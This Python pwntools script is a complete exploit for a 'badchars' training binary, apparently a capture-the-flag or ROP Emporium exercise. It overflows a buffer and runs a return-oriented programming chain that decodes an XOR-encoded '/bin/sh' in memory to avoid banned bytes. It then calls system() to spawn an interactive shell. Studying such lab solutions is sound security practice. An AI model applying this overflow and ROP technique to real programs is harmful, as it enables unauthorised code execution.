import struct
from pwn import *

# Setting up the binary
elf = ELF("./badchars")
p = elf.process()

# Initialization
writable = 0x6010f0
encoded_str = 0x2d606b6c2d716a02	
mov_data = 0x400b3b	# pop r12 ; pop r13 ; ret
copy_data = 0x400b34	# mov    QWORD PTR [r13+0x0],r12 ; ret
setup_analysis = 0x400b40	# pop r14 ; pop r15 ; ret
unpack_str = 0x400b30	# xor    BYTE PTR [r15],r14b ; ret
pop_rdi_ret = 0x400b39	# pop rdi ; ret
system = 0x4006f0

# Payload
buf = ""
buf += 'A' * 40
buf += struct.pack("<Q", mov_data)
buf += struct.pack(">Q", encoded_str)
buf += struct.pack("<Q", writable)
buf += struct.pack("<Q", copy_data)
for i in range(8):
	buf += struct.pack("<Q",setup_analysis)
	buf += struct.pack("<Q", 2)
	buf += struct.pack("<Q", writable+i)
	buf += struct.pack("<Q", unpack_str)
buf += struct.pack("<Q", pop_rdi_ret)
buf += struct.pack("<Q", writable)
buf += struct.pack("<Q", system)
	
#print buf
# Send the payload
p.recvuntil("> ")
p.send(buf)

p.interactive()
